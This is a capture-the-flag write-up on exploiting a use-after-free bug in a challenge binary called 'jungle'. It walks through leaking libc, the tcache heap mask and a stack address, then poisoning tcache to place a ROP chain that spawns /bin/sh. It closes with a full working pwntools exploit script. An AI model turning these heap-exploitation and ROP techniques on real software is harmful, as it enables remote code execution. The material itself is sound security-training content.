# Write-Up: Welcome to the Jungle!

The program has full protections:

```
pwn checksec ./jungle.bin
[*] '/root/workspace/jungle-adventure/solve/jungle.bin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

And includes a fairly modern *libc 2.39*. So we can patch it using ``pwninit`` to make sure our environment matches the target:

```sh
pwninit --bin jungle.bin --libc libc.so.6 --no-template
```

It suffers a vulnerability in the way it handles removing items. The program maintains a list of pockets in use and then marks each with either a 1 or 0. However, the *removeItem()* function just flips the integer that represents in use.

```c
void removeItem(int index) {
    if (knapsack[index] != NULL && used[index]==1) {    
        free(knapsack[index]);
        printf("<<< Removed item from pocket %d.\n", index );
    } else {
        printf("<<< Pocket %d is already empty.\n", index );
    }
    used[index]=!used[index];
}
```

Thus we can remove an item twice to allow use-after-free.

```

Enter your choice >>> 3
Select a pocket to remove an item from (1-6) >>> 1
<<< Removed item from pocket 1.

Enter your choice >>> 3
Select a pocket to remove an item from (1-6) >>> 1
<<< Pocket 1 is already empty.

Enter your choice >>> 1
Use item from which pocket (1-6) >>> 1
<<< Using item from pocket 1: TX%
<<< The TX% isn't effective against the tiger.

```

If we delete an item and then flip the used byte, we can use this to leak the heap mask used to encrypt tcache fd pointers.

```python
double_del_supplies(5)
data=use_supplies(5).lstrip(b' ').rstrip(b'\n')
heap_mask = u64(data.ljust(8, b'\x00'))
log.info(f'\tHeap Mask: {hex(heap_mask)}')    

```

Additionally, there is a handy libc leak if you name one of the items *genie*:

```python
add_supplies(1,b'Genie')
data=use_supplies(1)
p.recvuntil(b'starting point:')
libc_leak = int(p.recvline().strip(b'\n'),16)
libc.address = libc_leak - libc.sym.printf
```

After that it gets a lot trickier since in total we only get 25 turns before the game ends. With the heap mask and the use-after-free vulnerability, we can overwrite the tcache fd pointers. We can leverage this vulnerabiliy to leak the stack address by writing to the boundary of ``libc.sym.environment`` and then reading it.

```python
environ_symbol = libc.sym['environ']-24
log.info(f'\tLibc.sym.environ-24: {hex(environ_symbol)}')
addr = environ_symbol ^ heap_mask
for i in range(4,1,-1):
    del_supplies(i)
double_del_supplies(1) 
add_supplies(1,p64(addr))
add_supplies(2,b'X'*24)
add_supplies(3,b'Y'*23)
use_supplies(3)
p.recvuntil(b'<<< The ')
p.recvline()
data = p.recvline().split(b' isn')[0]
stack = u64(data.ljust(8, b'\x00'))
log.info(f'\tStack Leak: {hex(stack)}')
```

With knowledge of the stack and libc base addresses, we can just write a ROP chain to the stack and exit. There are a couple of constrain issues. For example, the address must by address & 0xf = 0x0. And we cannot free()/malloc() an already corrupted pointer.

My final script follows (also in [solve](solve)):

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

if args.REMOTE:
   libc = ELF('./libc.so.6',checksec=False)
else:
   libc = e.libc

gs = '''
break *$rebase(0x1c61)
continue
'''


def use_supplies(idx):
    p.recvuntil(b'Enter your choice >>> ')
    p.sendline(b'1')
    p.sendline(f'{idx}'.encode())
    p.recvuntil(b':')
    data = p.recvline()
    return data

def add_supplies(idx,data):
    p.recvuntil(b'Enter your choice >>> ')
    p.sendline(b'2')
    p.sendline(f'{idx}'.encode())
    p.sendline(data)

def del_supplies(idx):
    p.recvuntil(b'Enter your choice >>> ')
    p.sendline(b'3')
    p.sendline(f'{idx}'.encode())

def double_del_supplies(idx):
    del_supplies(idx)
    del_supplies(idx)

def start():
    if args.REMOTE:
        return remote(args.HOST,args.PORT)
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def leak_libc():
    log.info('Leaking libc base by wishing on a genie')
    add_supplies(1,b'Genie')
    data=use_supplies(1)
    p.recvuntil(b'starting point:')
    libc_leak = int(p.recvline().strip(b'\n'),16)
    libc.address = libc_leak - libc.sym.printf
    log.info(f'\tLibc Leak: {hex(libc_leak)}')
    log.info(f'\tLibc Base: {hex(libc.address)}')

def leak_heap_mask():
    log.info('Leaking heap mask from last item in tcache')
    double_del_supplies(5)
    data=use_supplies(5).lstrip(b' ').rstrip(b'\n')
    heap_mask = u64(data.ljust(8, b'\x00'))
    log.info(f'\tHeap Mask: {hex(heap_mask)}')    
    return heap_mask

def leak_stack_through_tcache_ptr(heap_mask):
    log.info('Leaking stack address by rewriting tcache fd to libc.sym.environ')
    environ_symbol = libc.sym['environ']-24
    log.info(f'\tLibc.sym.environ-24: {hex(environ_symbol)}')
    addr = environ_symbol ^ heap_mask
    for i in range(4,1,-1):
        del_supplies(i)
    double_del_supplies(1) 
    add_supplies(1,p64(addr))
    add_supplies(2,b'X'*24)
    add_supplies(3,b'Y'*23)
    use_supplies(3)
    p.recvuntil(b'<<< The ')
    p.recvline()
    data = p.recvline().split(b' isn')[0]
    stack = u64(data.ljust(8, b'\x00'))
    log.info(f'\tStack Leak: {hex(stack)}')
    return stack    

def write_rop_chain_to_stack(heap_mask,stack_leak):
    log.info('Writing ROP Chain by rewriting tcache fd to stack address')

    del_supplies(6)
    double_del_supplies(2)
    
    stack_target = stack_leak - 312 
    while (stack_target & 0xf !=0):
       stack_target = stack_target - 8

    log.info(f'\tWriting chain to {hex(stack_target)}')
    log.info(f'\tVerify alignment (stack target & 0xf) = {stack_target & 0xf}')
    addr = stack_target ^ heap_mask
    
    rl = ROP(libc)
    chain = p64(rl.find_gadget(['ret'])[0])*2
    chain += p64(rl.find_gadget(['pop rdi','ret'])[0])
    chain += p64(next(libc.search(b'/bin/sh')))
    chain += p64(libc.sym['system'])
    
    add_supplies(2,p64(addr))
    add_supplies(4,b'F'*23)
    add_supplies(6,chain)
    
def trigger_ROP_with_gameover():
    log.info('Ending game and triggering ROP Chain')
    use_supplies(1)
    use_supplies(1)
    use_supplies(1)
    use_supplies(1)
    use_supplies(1)

p = start()


leak_libc()
heap_mask = leak_heap_mask()
stack_leak = leak_stack_through_tcache_ptr(heap_mask)
write_rop_chain_to_stack(heap_mask, stack_leak)
trigger_ROP_with_gameover()

pause(1)
p.sendline(b'cat /flag.txt')
p.interactive()
```
